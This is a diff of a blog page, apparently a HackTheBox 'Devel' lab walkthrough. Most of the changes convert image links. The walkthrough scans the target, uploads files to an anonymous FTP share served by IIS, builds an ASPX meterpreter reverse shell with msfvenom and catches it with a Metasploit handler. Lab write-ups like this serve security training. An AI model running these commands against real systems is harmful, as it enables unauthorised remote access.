@@ -228,23 +228,24 @@ powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a
 
   <p><a href="https://app.hackthebox.com/machines/Devel">https://app.hackthebox.com/machines/Devel</a></p>
 <p>Step one: ping host to make sure it&rsquo;s active:
-<code>ping 10.10.10.5</code></p>
-<p>Step two: run nmap against host (in this case it doesn&rsquo;t matter how noisy we are):
+<code>ping 10.10.10.5</code>
+<img src="../../20230516174407.png" alt="1">
+Step two: run nmap against host (in this case it doesn&rsquo;t matter how noisy we are):
 <code>nmap -v -A -p- 10.10.10.5</code>
-![[Pasted image 20230516175101.png]]
-![[Pasted image 20230516175119.png]]</p>
+<img src="../../20230516175101.png" alt="1">
+<img src="../../20230516175119.png" alt="3img"></p>
 <p>So we know there are two services we can start with, anonymous ftp and a windows server on port 80 with option TRACE. It looks like the ftp share is actually in the root of the IIS web server:
-![[Pasted image 20230521185353.png]]</p>
+<img src="../../20230521185353.png" alt="img2"></p>
 <p>Based on that information let&rsquo;s see if we can upload a file and access it via our browser. Let&rsquo;s try a image. I&rsquo;m going to download a random one:
-![[Pasted image 20230521185544.png]]</p>
+<img src="../../20230521185544.png" alt="3"></p>
 <p>I&rsquo;m going to upload:
-![[Pasted image 20230521185720.png]]</p>
+<img src="../../20230521185720.png" alt="img4"></p>
 <p>Testing failed. Note, downloading the image from the ftp server and trying to open also fails.
-![[Pasted image 20230521185805.png]]</p>
+<img src="../../20230521185805.png" alt="img5"></p>
 <p>Let&rsquo;s try a text file:
-![[Pasted image 20230521192359.png]]
+<img src="../../20230521192359.png" alt="img 6">
 That worked!
-![[Pasted image 20230521185947.png]]</p>
+![img 7](/Pasted image 20230521185947.png)</p>
 <p>Now it&rsquo;s time to create a reverse shell. Based on what we already saw it needs to be ASPX since it&rsquo;s in an IIS site.</p>
 <p>Execute the following command to create the reverse shell:
 <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.13 LPORT=4444 -f aspx &gt; reverse.aspx </code>
@@ -257,7 +258,7 @@ Upload it to the ftp share:
 <code>set LHOST tun0</code>
 <code>run</code></p>
 <p>Now navigate to that file in the browser and a connection should be opened.
-![[Pasted image 20230521192307.png]]</p>
+<img src="../../20230521192307.png" alt="img 8"></p>
 <p>Inspired from the Windows Privilege Escalation course from TCM Security</p>
 
   <hr>
